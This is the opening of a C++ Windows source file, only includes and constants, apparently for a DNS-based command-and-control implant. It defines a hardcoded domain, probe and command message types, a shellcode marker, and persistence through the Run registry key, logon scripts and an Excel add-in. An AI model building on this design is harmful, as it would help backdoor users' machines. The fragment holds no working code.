#include <Windows.h>
#include <Strsafe.h>
#include <Windns.h>
#include "resource.h"
#include "Shlwapi.h"

#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include <ctime>


#pragma comment(lib, "Shlwapi.lib")
#pragma comment (lib, "Dnsapi.lib")


using std::cout;


#define MAX_DOMAIN_LENGTH 2048
#define PROBE "PROBE"
#define CMD "CMD"

#define DOMAIN_NAME "infogen.al"
#define MAX_DATA_LENGTH 1048576

#define START "{!"
#define END "!}"
#define NO_SHELLCODE "!@!"

#define PERSIST_RUNKEY 1
#define PERSIST_LOGONSCRIPT 2
#define PERSIST_EXCELADDIN 3

